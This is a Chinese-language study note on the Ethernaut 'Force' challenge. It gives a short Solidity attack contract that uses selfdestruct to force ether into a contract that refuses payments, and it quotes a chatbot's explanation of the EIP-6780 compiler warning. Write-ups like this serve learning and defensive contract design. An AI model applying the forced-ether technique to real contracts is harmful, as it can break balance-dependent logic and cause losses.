# 07-Force

日期: 19/08/2024
漏洞小结: Balance问题
简单明了: 通过selfdestruct来强行转Balance
难易: 简单

# 问题描述

Some contracts will simply not take your money `¯\_(ツ)_/¯`

The goal of this level is to make the balance of the contract greater than zero.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force { /*
                   MEOW ?
         /\_/\   /
    ____/ o o \
    /~____  =ø= /
    (______)__m_m)
                   */ }
```

# 攻击思路

题目就是一个空白的函数，没有任何内容

通过普通的payable函数肯定是没办法做到的，因为目标函数没有`receive`以及`fallback`

所以只能调用`selfdestruct`了

- 目标是个地址，不是个contract
- 目标地址需要被cast成`payable`

攻击函数的constructor也需要是`payable`，这样在创建的时候可以存入一点ether，在共计的时候可以传给目标

# 攻击方式

代码如下，上面是Force函数

```solidity
contract AttackForce{
    Force force;

    constructor(address _force) payable{
        force = Force(_force);
    }

    function Attack() public payable{
        selfdestruct(payable(address(force)));
    }
}
```

# Ethernuat总结

In solidity, for a contract to be able to receive ether, the fallback function must be marked `payable`.

However, there is no way to stop an attacker from sending ether to a contract by *self destroying*. **Hence, it is important not to count on the invariant `address(this).balance == 0` for any contract logic.**

# 小白的思考

两个点，第一个点比较蠢，但是的确值得记录一下。

刚开始的时候不知道如何去查看一个合约含有的balance，一直在想contract.什么的。用下面这个命令就可以了，显示结果为wei

```bash
await web3.eth.getBalance(contractAddress);
```

另一个点是在编译的时候告警（selfdestruct）了（以为编译失败），但不是错误，下面是GPT的意见和建议：

你遇到的这个警告是因为 `selfdestruct` 在最新的以太坊硬分叉（Cancun）中发生了变化。根据 EIP-6780，`selfdestruct` 现在不再删除合约的代码和数据，只是将合约的 ETH 转移给指定的受益人，除非它是在合约创建的同一交易中执行的。

虽然这个更改不会影响我们解决这个问题的基本思路，但它提醒我们在使用 `selfdestruct` 时要小心，因为未来可能会有进一步的限制或修改。

### 解决方案：

你仍然可以按照原计划使用 `selfdestruct` 来完成这个 Ethernaut 题目。因为这个挑战的核心在于将 ETH 转移到目标合约，而 `selfdestruct` 依旧能够做到这一点，即便在硬分叉之后。你可以暂时忽略这个警告。

以下是步骤：

1. 编写和部署攻击合约，确保在部署时传入一定数量的 ETH。
2. 使用 `selfdestruct` 将 ETH 转移到目标合约。

### 关于警告的解释：

- `selfdestruct` 的行为变化主要是为了防止一些旧的攻击模式，并提升 EVM 的灵活性。
- 对于这种 CTF 类型的挑战，你不必担心这个警告。只要能够完成目标即可。